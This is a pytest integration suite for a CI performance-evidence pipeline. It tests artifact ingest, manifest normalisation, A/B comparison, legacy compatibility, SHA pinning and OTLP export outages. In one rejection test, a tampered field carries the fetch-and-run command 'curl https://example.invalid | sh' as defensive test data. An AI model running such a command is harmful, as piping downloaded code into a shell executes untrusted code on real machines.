"""End-to-end consumer compatibility: artifact -> ingest -> comparison -> OTLP/Grafana transform.

Fixtures under ``tests/fixtures/consumer-performance`` are synthetic consumer artifacts built from
the W0 envelope fixtures and the Actions run/job shapes. Nothing here dispatches a workflow or
contacts a live collector. Live baseline and Cloud validation remain pending and are listed in the
upgrade evidence artifact rather than claimed.
"""

from __future__ import annotations

import copy
import json
import os
import subprocess
from pathlib import Path

import pytest

from pipeline_toolkit.compare.performance import (
    ExperimentDeclaration,
    RunObservation,
    build_plan,
    compare_experiment,
)
from pipeline_toolkit.contracts.performance_evidence import (
    SCHEMA_ID,
    PerformanceEvidenceError,
    dumps_envelope,
    read_legacy_module_record,
    to_legacy_module_record,
    validate_envelope,
)
from pipeline_toolkit.normalize.performance import MANIFEST_SCHEMA, normalize_execution, select_run_attempt
from pipeline_toolkit.telemetry import ExportConfig, MetricPolicy, SQLiteReplayStore, TelemetryBudget, export_otlp
from pipeline_toolkit.telemetry.export import HttpResponse
from pipeline_toolkit.telemetry.model import EMITTED_LAYER_METRICS
from pipeline_toolkit.telemetry.timeline import normalize_actions_timeline
from pipeline_toolkit.telemetry.transform import transform_layer_evidence
from pipeline_toolkit.compare.performance import POLICY_VERSION

ROOT = Path(__file__).resolve().parents[1]
FIXTURES = ROOT / "tests" / "fixtures"
CONSUMER = FIXTURES / "consumer-performance"
PINNED_REF = "7ecbb89aae771604d9c1c532cf123f239e279110"
REPO = "YRootLab/OnMaru-backend"
RUN_ID = 24712345678
SHA = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
POLICY = MetricPolicy("ci", "consumer-test")
OBSERVED_NS = 1790812801000000000
SCENARIOS = ("success", "failure", "cancel", "partial", "mixed-cache")
OUTCOME_FOR = {"success": "success", "failure": "failure", "cancel": "cancelled",
               "partial": "success", "mixed-cache": "success"}
EVIDENCE_PATH_ENV = "CONSUMER_UPGRADE_EVIDENCE_PATH"
EVIDENCE_SCHEMA = "consumer-upgrade-evidence/1"

CHANGE_LIST = [
    "tests/fixtures/consumer-performance/*.json (five representative consumer scenarios)",
    "tests/fixtures/consumer-performance/executable-looking.sh (executable-looking negative payload)",
    "tests/test_consumer_performance_integration.py (end-to-end compatibility suite)",
    "scripts/verify_toolkit.sh (guard that the suite is present in the Toolkit verification path)",
]
LIVE_NOT_VERIFIED = [
    {"item": "Baseline manifests: current workflow at Toolkit ref 7ecbb89aae771604d9c1c532cf123f239e279110, 3 to 5 live runs",
     "status": "pending", "owner": "separate baseline sub-issue"},
    {"item": "Backend #867 collector: live OTLP export and Mimir/Tempo ingestion", "status": "pending",
     "owner": "Backend #867"},
    {"item": "Grafana Cloud dashboards rendered from live telemetry (not local smoke)", "status": "pending",
     "owner": "W3 rollout"},
    {"item": "SHA-pinned consumer workflow run with performance artifact upload on GitHub Actions", "status": "pending",
     "owner": "consumer rollout"},
    {"item": "p95 on a real rolling 14-day cohort with at least 100 valid runs", "status": "pending",
     "owner": "post-baseline"},
]


def _load(name):
    return json.loads((CONSUMER / f"{name}.json").read_text(encoding="utf-8"))


def _envelope_bytes(envelope):
    return json.dumps(envelope, sort_keys=True).encode("utf-8")


def _timeline(scenario, *, run_overrides=None, jobs_override=None, total_override=None, ref=None):
    run = dict(scenario["run"], **(run_overrides or {}))
    jobs = copy.deepcopy(jobs_override if jobs_override is not None else scenario["jobs"]["jobs"])
    total = total_override if total_override is not None else scenario["jobs"]["total_count"]
    return normalize_actions_timeline(run, {"total_count": total, "jobs": jobs},
                                      toolkit_ref=ref if ref is not None else scenario["pinned_toolkit_ref"])


def _artifact(scenario, *, envelope=None, name=None, artifact_id=5):
    raw = _envelope_bytes(envelope if envelope is not None else scenario["artifact"]["envelope"])
    return {"id": artifact_id, "name": name or scenario["artifact"]["name"], "size_in_bytes": len(raw), "data": raw}


def _pipeline(name):
    """Run ingest and the layer transform for one consumer scenario."""
    scenario = _load(name)
    timeline = _timeline(scenario)
    artifact = _artifact(scenario)
    manifest = normalize_execution(timeline, [artifact])
    bundle = transform_layer_evidence(manifest, POLICY, event="pull_request", lane="spring-full",
                                      test_type="full", performance_bytes=artifact["data"],
                                      observed_at_ns=OBSERVED_NS)
    return {"scenario": scenario, "timeline": timeline, "artifact": artifact, "manifest": manifest,
            "bundle": bundle}


def _span(bundle, name):
    matches = [span for span in bundle.spans if span.name == name]
    assert len(matches) == 1, f"expected exactly one span named {name}"
    return matches[0]


def _metric_values(bundle, name):
    return [point for point in bundle.metrics if point.name == name]


def _git_head():
    try:
        out = subprocess.run(["git", "rev-parse", "HEAD"], cwd=ROOT, capture_output=True,
                             text=True, timeout=10, check=True)
        return out.stdout.strip()
    except (OSError, subprocess.SubprocessError):
        return "unavailable"


def pin_gate(manifest, pinned_ref):
    """Consumer-side SHA pin check used by this suite. Product code validates only the SHA format."""
    actual = manifest["identity"]["toolkit_ref"]
    if actual != pinned_ref:
        raise ValueError(f"toolkit ref {actual!r} does not match pinned ref {pinned_ref!r}")
    return True


# ---------------------------------------------------------------------------
# 1. Scenario round trip: ingest, manifest, trace and metrics agree
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("name", SCENARIOS)
def test_consumer_scenario_round_trips_end_to_end(name):
    run = _pipeline(name)
    manifest, bundle, scenario = run["manifest"], run["bundle"], run["scenario"]
    identity = manifest["identity"]

    assert manifest["schema"] == MANIFEST_SCHEMA
    assert manifest["source"]["verdict"] == scenario["expected"]["source_verdict"]
    assert manifest["performance"]["status"] == scenario["expected"]["performance"]
    assert identity["repository"] == REPO
    assert identity["commit_sha"] == SHA
    assert identity["run_id"] == RUN_ID
    assert identity["run_attempt"] == 1
    assert identity["toolkit_ref"] == PINNED_REF
    assert identity["same_run"] is True

    # manifest <-> trace identity
    assert bundle.identity.repository == REPO
    assert bundle.identity.run_id == RUN_ID
    assert bundle.identity.attempt == 1
    assert bundle.identity.manifest_digest == manifest["manifest_digest"]
    workflow = _span(bundle, "RUN " + POLICY.workflow)
    assert workflow.attributes["cicd.pipeline.run.id"] == str(RUN_ID)
    assert workflow.attributes["vcs.ref.head.revision"] == SHA
    assert workflow.attributes["toolkit.ci.manifest.digest"] == manifest["manifest_digest"]
    assert workflow.attributes["toolkit.ci.source_conclusion"] == manifest["source"]["conclusion"]
    assert workflow.attributes["toolkit.ci.source_verdict"] == manifest["source"]["verdict"]
    assert bundle.ci_conclusion == manifest["source"]["conclusion"]

    # job lanes: every manifest job with a duration produces exactly one duration point
    durations = [job for job in manifest["jobs"] if job["duration_seconds"] is not None]
    job_points = _metric_values(bundle, "onmaru_ci_job_duration_seconds")
    assert sum(len(point.values) for point in job_points) == len(durations)
    assert {point.labels["lane"] for point in job_points} <= {job["logical_id"] for job in manifest["jobs"]} | {"other"}

    # labels stay in the finite catalogue; identity never leaks into metric labels
    for point in bundle.metrics:
        assert set(point.labels) == set(EMITTED_LAYER_METRICS[point.name][2])
        assert str(RUN_ID) not in point.labels.values()
        assert SHA not in point.labels.values()


def test_success_and_mixed_cache_cache_operations_match_manifest_layers():
    run = _pipeline("mixed-cache")
    layers = run["scenario"]["artifact"]["envelope"]["cache"]["cacheIdentity"]["layers"]
    expected = {"dependency": "hit", "build": "miss", "configuration": "disabled"}
    assert {name: layers[name]["state"] for name in expected} == {"dependency": "warm", "build": "cold",
                                                               "configuration": "disabled"}
    ops = {point.labels["cache_result"]: point.values[0]
           for point in _metric_values(run["bundle"], "onmaru_ci_build_cache_operations_total")}
    assert ops == {"hit": 1.0, "miss": 1.0, "disabled": 1.0}


def test_partial_short_page_never_reports_a_false_success():
    run = _pipeline("partial")
    manifest = run["manifest"]
    assert run["timeline"]["run"]["conclusion"] == "success"
    assert manifest["source"]["conclusion"] == "success"
    assert manifest["source"]["verdict"] == "unverified"
    assert "timeline:partial_jobs" in manifest["quality"]["issues"]
    assert run["bundle"].ci_conclusion == "success"
    workflow = _span(run["bundle"], "RUN " + POLICY.workflow)
    assert workflow.attributes["toolkit.ci.source_verdict"] == "unverified"


def test_cancelled_and_failed_runs_keep_their_source_verdict_and_partial_quality():
    cancel = _pipeline("cancel")
    assert cancel["manifest"]["source"]["verdict"] == "cancelled"
    assert "performance_quality_partial" in cancel["manifest"]["quality"]["issues"]
    assert cancel["manifest"]["performance"]["timings_ms"]["container_prepare"] is None
    failure = _pipeline("failure")
    assert failure["manifest"]["source"]["verdict"] == "failure"
    assert _span(failure["bundle"], "RUN " + POLICY.workflow).status_code == 2


# ---------------------------------------------------------------------------
# 2. Comparison consumes the same consumer observations
# ---------------------------------------------------------------------------

def _observations(plan_slots, *, candidate_scenario="success", candidate_outcome=None,
                  candidate_envelope=None, baseline_scenario="success", pivot_slot=None):
    scenarios = {name: _load(name) for name in SCENARIOS}
    observations = []
    for entry in plan_slots:
        side, slot = entry["side"], entry["slot"]
        if side == "baseline":
            source, outcome, envelope = scenarios[baseline_scenario], "success", None
        else:
            source, outcome, envelope = scenarios[candidate_scenario], "success", None
        if side == "candidate" and slot == pivot_slot:
            outcome = candidate_outcome or OUTCOME_FOR[candidate_scenario]
            envelope = candidate_envelope
        envelope = envelope if envelope is not None else source["artifact"]["envelope"]
        run_id = str(RUN_ID) if (side == "baseline" and slot == 1) else f"{RUN_ID + slot}"
        value = 400000.0 + slot * 1000.0 + (5000.0 if side == "candidate" else 0.0)
        observations.append(RunObservation(side=side, slot=slot, run_id=run_id, outcome=outcome,
                                           restore_policy="restore-v1", envelope=envelope,
                                           wall_clock_ms=value))
    return observations


DECLARATION = ExperimentDeclaration("consumer-compat-1", "realistic-pr", 3, plan_kind="AB-BA")


def test_comparison_of_identical_consumer_envelopes_is_comparable_and_identity_matches_manifest():
    plan = build_plan(DECLARATION)
    result = compare_experiment(DECLARATION, _observations(plan), as_of="2026-11-22T00:00:00Z")
    assert result["classification"] == "comparable", result["reasons"]
    assert result["comparison"]["paired"]["pairs"] == 3
    assert result["comparison"]["overhead"]["budget_ms"] == pytest.approx(
        min(0.03 * result["sides"]["baseline"]["median"], 15000.0))

    manifest = _pipeline("success")["manifest"]
    baseline_identity = result["sides"]["baseline"]["identity"]
    assert baseline_identity["repository"] == manifest["identity"]["repository"]
    assert baseline_identity["workflow"] == manifest["identity"]["workflow"]
    assert baseline_identity["toolchain.runner_image"] == "ubuntu-24.04@sha256:runner"
    slot1 = next(s for s in result["sides"]["baseline"]["samples"] if s["slot"] == 1)
    assert slot1["run_id"] == str(manifest["identity"]["run_id"])


def test_failure_and_partial_observations_stay_in_denominators_and_block_comparability():
    plan = build_plan(DECLARATION)
    partial_env = _load("cancel")["artifact"]["envelope"]
    sixth = max(entry["slot"] for entry in plan if entry["side"] == "candidate")
    failed = compare_experiment(
        DECLARATION, _observations(plan, candidate_outcome="failure", pivot_slot=sixth),
        as_of="2026-11-22T00:00:00Z")
    assert failed["classification"] == "insufficient-evidence"
    assert failed["sides"]["candidate"]["failed"] == 1
    assert failed["sides"]["candidate"]["attempts"] == 3
    assert failed["sides"]["candidate"]["valid_samples"] == 2

    partial = compare_experiment(
        DECLARATION, _observations(plan, candidate_envelope=partial_env, pivot_slot=sixth),
        as_of="2026-11-22T00:00:00Z")
    # a partial envelope is excluded from valid samples and its layer states drift within the side
    assert partial["classification"] == "incomparable"
    assert partial["sides"]["candidate"]["exclusions"].get("quality_partial") == 1
    assert partial["sides"]["candidate"]["valid_samples"] == 2
    assert {r["code"] for r in partial["reasons"]} >= {"layer_state_mismatch"}


def test_mixed_cache_candidate_without_declared_variable_is_incomparable():
    plan = build_plan(DECLARATION)
    result = compare_experiment(DECLARATION, _observations(plan, candidate_scenario="mixed-cache"),
                                as_of="2026-11-22T00:00:00Z")
    assert result["classification"] == "incomparable"
    assert result["comparison"] is None
    assert any(reason["field"].startswith("layer.") for reason in result["reasons"])


# ---------------------------------------------------------------------------
# 3. Old (legacy-limited) and new envelope compatibility, both directions
# ---------------------------------------------------------------------------

def test_new_envelope_projects_to_legacy_record_and_legacy_reader_keeps_cache_state_verbatim():
    envelope = _load("success")["artifact"]["envelope"]
    legacy_record = to_legacy_module_record(envelope)
    assert legacy_record["environment_identity"]["cache_state"] == \
        "dependency=warm;build=warm;configuration=warm"
    assert legacy_record["run_id"] == str(RUN_ID)

    reread = read_legacy_module_record(legacy_record)
    validate_envelope(reread)
    assert reread["quality"] == "legacy-limited"
    assert reread["legacy"]["cache_state"] == legacy_record["environment_identity"]["cache_state"]
    assert "cache" not in reread
    assert reread["source"]["run_attempt"] is None


def test_legacy_fixtures_are_read_as_limited_and_cannot_pass_as_new_envelopes():
    legacy = json.loads((FIXTURES / "performance-evidence" / "legacy.json").read_text())
    assert validate_envelope(copy.deepcopy(legacy))["quality"] == "legacy-limited"
    record = json.loads((FIXTURES / "performance-evidence" / "legacy-module-record.json").read_text())
    assert read_legacy_module_record(record)["legacy"]["cache_state"] == "warm"

    upgraded = copy.deepcopy(legacy)
    upgraded["quality"] = "complete"
    with pytest.raises(PerformanceEvidenceError):
        validate_envelope(upgraded)
    with pytest.raises(PerformanceEvidenceError):
        dumps_envelope(upgraded)


def test_legacy_envelope_is_never_joined_or_compared_as_new_evidence():
    legacy = json.loads((FIXTURES / "performance-evidence" / "legacy.json").read_text())
    scenario = _load("success")
    manifest = normalize_execution(_timeline(scenario), [_artifact(scenario, envelope=legacy)])
    assert manifest["performance_artifacts"][0]["reason"] == "foreign_attempt"
    assert manifest["performance"]["status"] == "rejected"
    assert manifest["source"]["verdict"] == "success"
    with pytest.raises(ValueError, match="without a joined manifest"):
        transform_layer_evidence(manifest, POLICY, event="pull_request", lane="spring-full",
                                 test_type="full", performance_bytes=_envelope_bytes(legacy),
                                 observed_at_ns=OBSERVED_NS)

    plan = build_plan(DECLARATION)
    result = compare_experiment(DECLARATION, _observations(plan, candidate_envelope=legacy,
                                                          pivot_slot=max(e["slot"] for e in plan
                                                                         if e["side"] == "candidate")),
                                as_of="2026-11-22T00:00:00Z")
    # a legacy-limited sample is excluded from valid samples, so the experiment can never be comparable
    assert result["classification"] == "insufficient-evidence"
    assert result["sides"]["candidate"]["exclusions"] == {"quality_legacy-limited": 1}
    assert result["sides"]["candidate"]["valid_samples"] == 2
    assert result["comparison"] is None


def test_legacy_reader_rejects_new_envelope_and_projection_refuses_legacy_input():
    envelope = _load("success")["artifact"]["envelope"]
    with pytest.raises(PerformanceEvidenceError):
        read_legacy_module_record(envelope)
    legacy = read_legacy_module_record(
        json.loads((FIXTURES / "performance-evidence" / "legacy-module-record.json").read_text()))
    with pytest.raises(PerformanceEvidenceError):
        to_legacy_module_record(legacy)


# ---------------------------------------------------------------------------
# 4. SHA-pinned invocation and fail-closed identity
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("bad_ref", ["main", "v0.1.0", PINNED_REF.upper(), PINNED_REF[:39]])
def test_unpinned_toolkit_ref_is_rejected_before_any_evidence_is_read(bad_ref):
    scenario = _load("success")
    with pytest.raises(ValueError, match="immutable"):
        _timeline(scenario, ref=bad_ref)


def test_pin_gate_accepts_the_pinned_ref_and_refuses_a_different_one():
    scenario = _load("success")
    manifest = normalize_execution(_timeline(scenario), [_artifact(scenario)])
    assert pin_gate(manifest, PINNED_REF) is True
    other = normalize_execution(_timeline(scenario, ref="b" * 40), [_artifact(scenario)])
    with pytest.raises(ValueError, match="does not match pinned ref"):
        pin_gate(other, PINNED_REF)


@pytest.mark.parametrize("changes, reason", [
    ({"source": {"commit_sha": "b" * 40}}, "foreign_sha"),
    ({"source": {"run_attempt": 2}}, "foreign_attempt"),
    ({"source": {"workflow_run_id": "999"}}, "foreign_run"),
    ({"source": {"repository": "Other/repo"}}, "foreign_repository"),
])
def test_different_sha_attempt_run_or_repo_is_rejected_and_source_verdict_is_kept(changes, reason):
    scenario = _load("success")
    envelope = copy.deepcopy(scenario["artifact"]["envelope"])
    for key, value in changes["source"].items():
        envelope["source"][key] = value
    manifest = normalize_execution(_timeline(scenario), [_artifact(scenario, envelope=envelope)])
    assert manifest["performance_artifacts"][0]["reason"] == reason
    assert manifest["performance"]["status"] == "rejected"
    assert manifest["identity"]["same_run"] is False
    assert manifest["identity"]["performance_artifact_digest"] is None
    assert manifest["source"]["verdict"] == "success"
    # a rejected artifact produces no layer telemetry and no performance bytes
    bundle = transform_layer_evidence(manifest, POLICY, event="pull_request", lane="spring-full",
                                      test_type="full", observed_at_ns=OBSERVED_NS)
    assert _metric_values(bundle, "onmaru_ci_tests_executed_total") == []
    assert bundle.ci_conclusion == "success"


def test_requested_attempt_that_is_not_present_fails_closed():
    scenario = _load("success")
    timeline = _timeline(scenario)
    with pytest.raises(ValueError, match="requested attempt is not present"):
        select_run_attempt([timeline], RUN_ID, attempt=2)
    with pytest.raises(ValueError, match="no timeline for requested run"):
        select_run_attempt([timeline], RUN_ID + 1)


def test_executable_looking_payload_is_rejected_fail_closed():
    scenario = _load("success")
    payload = scenario["artifact"]["envelope"]
    script = (CONSUMER / "executable-looking.sh").read_bytes()
    raw_script = {"id": 9, "name": "ci-performance-evidence", "size_in_bytes": len(script), "data": script}
    manifest = normalize_execution(_timeline(scenario), [raw_script])
    assert manifest["performance_artifacts"][0]["reason"] == "invalid_envelope"
    assert manifest["performance"]["status"] == "rejected"
    assert manifest["performance_artifacts"][0]["status"] == "rejected"
    # the bytes are treated as data: nothing is executed and no envelope fields are inferred
    assert manifest["performance"].get("schema") is None
    assert manifest["performance"]["timings_ms"]["tests"] is None
    # a nested payload that is JSON but carries an unknown key is also refused
    tampered = copy.deepcopy(payload)
    tampered["run_script"] = "curl https://example.invalid | sh"
    refused = normalize_execution(_timeline(scenario), [_artifact(scenario, envelope=tampered)])
    assert refused["performance_artifacts"][0]["reason"] == "invalid_envelope"


def test_executable_suffix_on_artifact_name_is_rejected():
    scenario = _load("success")
    manifest = normalize_execution(_timeline(scenario),
                                   [_artifact(scenario, name="ci-performance-evidence.sh")])
    assert manifest["performance_artifacts"][0]["status"] == "rejected"


# ---------------------------------------------------------------------------
# 5. Export outage never changes the source CI verdict
# ---------------------------------------------------------------------------

def _failing_transport(mode):
    def transport(url, body, headers, timeout):
        if mode == "exception":
            raise OSError("collector unreachable")
        return HttpResponse(503, b"", {})
    return transport


@pytest.mark.parametrize("name", ["success", "failure", "cancel"])
@pytest.mark.parametrize("mode", ["exception", "http-503"])
def test_export_outage_does_not_change_the_source_ci_verdict(name, mode, tmp_path):
    run = _pipeline(name)
    manifest, bundle = run["manifest"], run["bundle"]
    before_manifest = copy.deepcopy(manifest)
    before_conclusion = bundle.ci_conclusion

    config = ExportConfig("http://127.0.0.1:4318", max_attempts=2)
    store = SQLiteReplayStore(tmp_path / "replay.sqlite")
    result = export_otlp(bundle, config, store, transport=_failing_transport(mode),
                         sleep=lambda seconds: None)

    assert result.status in {"failed", "partial"}
    assert result.ci_conclusion == before_conclusion == manifest["source"]["conclusion"]
    assert manifest == before_manifest
    assert bundle.ci_conclusion == before_conclusion
    assert manifest["source"]["verdict"] == before_manifest["source"]["verdict"]
    assert manifest["manifest_digest"] == before_manifest["manifest_digest"]
    # a rebuilt execution from the same input is unaffected by the outage
    rebuilt = normalize_execution(run["timeline"], [run["artifact"]])
    assert rebuilt["source"]["verdict"] == manifest["source"]["verdict"]


def test_export_outage_then_recovery_keeps_identity_and_verdict(tmp_path):
    run = _pipeline("success")
    store = SQLiteReplayStore(tmp_path / "replay.sqlite")
    config = ExportConfig("http://127.0.0.1:4318", max_attempts=1)
    down = export_otlp(run["bundle"], config, store, transport=_failing_transport("exception"),
                       sleep=lambda seconds: None)
    assert down.status == "failed" and down.ci_conclusion == "success"

    accepted = []

    def ok(url, body, headers, timeout):
        accepted.append(url)
        return HttpResponse(200, b"{}", {"content-type": "application/json"})

    up = export_otlp(run["bundle"], config, store, transport=ok, sleep=lambda seconds: None)
    assert up.ci_conclusion == "success"
    assert up.status in {"exported", "duplicate"}
    assert accepted


# ---------------------------------------------------------------------------
# 6. Upgrade evidence artifact
# ---------------------------------------------------------------------------

def _upgrade_evidence():
    scenarios = []
    for name in SCENARIOS:
        run = _pipeline(name)
        scenarios.append({
            "name": name,
            "source_conclusion": run["manifest"]["source"]["conclusion"],
            "source_verdict": run["manifest"]["source"]["verdict"],
            "performance_status": run["manifest"]["performance"]["status"],
            "manifest_digest": run["manifest"]["manifest_digest"],
        })
    return {
        "schema": EVIDENCE_SCHEMA,
        "generated_by": "tests/test_consumer_performance_integration.py",
        "sha": {
            "toolkit_head": _git_head(),
            "pinned_consumer_toolkit_ref": PINNED_REF,
            "consumer_commit_sha": SHA,
        },
        "schemas": {
            "performance_envelope": SCHEMA_ID,
            "normalized_execution": MANIFEST_SCHEMA,
            "comparison_policy": POLICY_VERSION,
            "telemetry_layer_metrics": "onmaru_ci layer registry",
        },
        "scenarios": scenarios,
        "change_list": CHANGE_LIST,
        "verification": {
            "status": "fixture-verified",
            "scope": "synthetic consumer fixtures; no live workflow, collector or Cloud query",
        },
        "live_not_verified": LIVE_NOT_VERIFIED,
    }


def test_upgrade_evidence_artifact_records_sha_schema_changes_and_unverified_live_items(tmp_path):
    target = Path(os.environ.get(EVIDENCE_PATH_ENV) or (ROOT / "artifacts" / "consumer-upgrade-evidence.json"))
    evidence = _upgrade_evidence()
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(json.dumps(evidence, indent=2, sort_keys=True, ensure_ascii=False) + "\n",
                      encoding="utf-8")

    written = json.loads(target.read_text(encoding="utf-8"))
    assert written["schema"] == EVIDENCE_SCHEMA
    assert written["sha"]["pinned_consumer_toolkit_ref"] == PINNED_REF
    assert written["sha"]["toolkit_head"] == _git_head()
    assert written["schemas"]["performance_envelope"] == SCHEMA_ID
    assert [s["name"] for s in written["scenarios"]] == list(SCENARIOS)
    assert written["change_list"] == CHANGE_LIST
    assert written["verification"]["status"] == "fixture-verified"
    live = {item["item"]: item["status"] for item in written["live_not_verified"]}
    assert live and set(live.values()) == {"pending"}
    assert any("7ecbb89aae771604d9c1c532cf123f239e279110" in item for item in live)
    assert any("Backend #867" in item for item in live)


# ---------------------------------------------------------------------------
# 7. Budget and bundle invariants at consumer scale
# ---------------------------------------------------------------------------

def test_layer_transform_stays_inside_the_default_telemetry_budget():
    run = _pipeline("mixed-cache")
    budget = TelemetryBudget()
    assert len(run["bundle"].spans) <= budget.max_spans
    assert len({(p.name, tuple(sorted(p.labels.items()))) for p in run["bundle"].metrics}) <= budget.max_series


def test_missing_span_and_metric_identity_are_not_zero_filled():
    run = _pipeline("cancel")
    assert "gradle_task" in {span.name for span in run["bundle"].spans}
    assert "container_prepare" not in {span.name for span in run["bundle"].spans}
    assert not _metric_values(run["bundle"], "onmaru_ci_testcontainers_startup_seconds")

